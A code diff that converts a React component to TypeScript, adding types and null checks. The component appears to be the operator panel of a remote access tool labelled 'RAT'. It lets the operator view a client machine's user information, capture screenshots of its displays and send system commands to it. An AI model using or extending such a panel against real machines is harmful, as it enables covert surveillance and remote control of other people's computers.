@@ -2,35 +2,36 @@ import { useEffect, useState, useRef } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { invoke } from "@tauri-apps/api/tauri";
 import { listen } from "@tauri-apps/api/event";
+import { RATClient } from "../../types";
 
-export const ClientView = () => {
+export const ClientView: React.FC = () => {
   const { id } = useParams();
-  const [client, setClient] = useState({});
-  const [loaded, setLoaded] = useState(false);
-  const [screenshot, setScreenshot] = useState(null);
+  const [client, setClient] = useState<RATClient | null>(null);
+  const [loaded, setLoaded] = useState<boolean>(false);
+  const [screenshot, setScreenshot] = useState<string | null>(null);
 
   const navigate = useNavigate();
 
   async function fetchClient() {
-    let ok = await invoke("fetch_client", { id });
+    let ok: RATClient = await invoke("fetch_client", { id });
     setClient(ok);
     setLoaded(true);
   }
 
   async function waitScreenshot() {
     const unlisten = listen("client_screenshot", (event) => {
-      setScreenshot(event.payload);
+      setScreenshot(event.payload as string);
     });
   }
 
-  async function takeScreenshot(display) {
+  async function takeScreenshot(display: number) {
     let ok = await invoke("take_screenshot", {
       id,
-      display: parseInt(display),
+      display: display,
     });
   }
 
-  async function handleSystem(cmd) {
+  async function handleSystem(cmd: string) {
     let ok = await invoke("handle_system_command", { id, run: cmd });
   }
 
@@ -39,12 +40,12 @@ export const ClientView = () => {
   }, []);
 
   useEffect(() => {
-    if (client.disconnected) {
+    if (client && client.disconnected) {
       navigate("/clients");
     }
   }, [client]);
 
-  const fetchVec = (vec) => {
+  const fetchVec = (vec: string[]) => {
     let vecString = "\n";
 
     vec.forEach((v) => {
@@ -61,7 +62,7 @@ export const ClientView = () => {
   return (
     <div className="client p-8 flex flex-1 flex-col overflow-auto w-full items-center">
       <div className="flex flex-row gap-8">
-        {loaded ? (
+        {loaded && client != null ? (
           <div className="card bg-base-100 !min-w-[350px] shadow-xl border border-white">
             <div className="card-body" style={{ whiteSpace: "pre-line" }}>
               <h2 className="card-title">User Information</h2>
@@ -142,15 +143,16 @@ export const ClientView = () => {
           </figure>
           <div className="card-body items-center text-center">
             <div className="">
-              {[...Array(client.displays).keys()].map((index) => (
-                <a
-                  key={index}
-                  onClick={() => takeScreenshot(index)}
-                  className="btn btn-active"
-                >
-                  Screenshot Display {index}
-                </a>
-              ))}
+              {client &&
+                [...Array(client.displays).keys()].map((index) => (
+                  <a
+                    key={index}
+                    onClick={() => takeScreenshot(index)}
+                    className="btn btn-active"
+                  >
+                    Screenshot Display {index}
+                  </a>
+                ))}
             </div>
           </div>
         </div>
